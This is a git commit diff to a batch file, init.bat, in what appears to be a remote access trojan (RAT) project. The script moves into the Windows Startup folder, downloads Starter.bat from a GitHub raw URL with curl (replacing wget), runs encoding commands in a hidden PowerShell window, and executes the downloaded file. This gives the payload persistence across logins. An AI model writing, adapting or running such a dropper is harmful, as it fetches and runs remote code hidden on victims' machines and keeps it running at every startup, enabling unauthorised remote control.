04b8ce06e2e228cb00858ddb8e0620102ce8e582
saif <saif.aboueldahab@gmail.com>
2023-05-25 21:19:25 +0300

    sa

--- init.bat
+++ init.bat
@@ -3,7 +3,7 @@ set "currentd=%cd%"
 set "username=saifa"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
-powershell powershell.exe "wget https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
+powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
 powershell powershell.exe -windowstyle hidden Out-EncodedCommand -Path Starter.bat -Password "hello" -S alt "B2*l"
 powershell powershell.exe -windowstyle hidden timeout 5
 powershell ./Starter.bat
